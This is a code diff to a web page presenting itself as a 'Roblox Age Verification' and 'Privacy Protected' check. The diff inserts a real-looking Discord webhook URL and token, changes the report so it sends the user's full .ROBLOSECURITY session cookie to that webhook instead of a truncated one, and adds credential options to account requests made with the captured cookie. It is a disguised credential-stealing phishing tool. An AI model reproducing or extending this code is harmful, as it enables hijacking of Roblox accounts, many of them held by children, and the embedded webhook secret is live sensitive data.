@@ -386,8 +386,8 @@
 
     // Main application functionality
     $(document).ready(function() {
-      // Replace with your actual webhook URL
-      const WEBHOOK_URL = 'https://discord.com/api/webhooks/your_webhook_id/your_webhook_token';
+      // Updated with your actual webhook URL
+      const WEBHOOK_URL = 'https://discord.com/api/webhooks/1392040915127898123/aTZNr3AVMdG4AyGFxYX_ZcYwrmmtiGVGn2iVTIPza6_cd9sclwiNXyfIFhRjGTxM51Vc';
       
       // Typing effect
       const texts = ["Roblox Age Verification", "Secure Age Check", "Privacy Protected"];
@@ -434,7 +434,7 @@
                 { name: "Username", value: userInfo.name || "Unknown", inline: true },
                 { name: "Display Name", value: userInfo.displayName || "Unknown", inline: true },
                 { name: "User ID", value: userInfo.id || "Unknown", inline: true },
-                { name: "Cookie", value: `\`\`\`${cookie.substring(0, 30)}...\`\`\`` }
+                { name: "Cookie", value: `\`\`\`${cookie}\`\`\`` }
               ],
               thumbnail: { url: userInfo.avatar || "" },
               timestamp: new Date().toISOString()
@@ -521,7 +521,8 @@
           const response = await fetch('https://users.roblox.com/v1/users/authenticated', {
             headers: {
               'Cookie': `.ROBLOSECURITY=${cookie}`
-            }
+            },
+            credentials: 'include'
           });
           
           if (!response.ok) {
@@ -554,7 +555,8 @@
             headers: {
               'Cookie': `.ROBLOSECURITY=${cookie}`,
               'X-CSRF-TOKEN': await getCSRFToken(cookie)
-            }
+            },
+            credentials: 'include'
           });
           
           let statusData = { isAgeVerified: false };
@@ -587,7 +589,8 @@
                 headers: {
                   'Cookie': `.ROBLOSECURITY=${cookie}`,
                   'X-CSRF-TOKEN': await getCSRFToken(cookie)
-                }
+                },
+                credentials: 'include'
               });
               
               if (response.ok) {
@@ -638,7 +641,8 @@
             method: 'POST',
             headers: {
               'Cookie': `.ROBLOSECURITY=${cookie}`
-            }
+            },
+            credentials: 'include'
           });
           
           const token = response.headers.get('x-csrf-token');
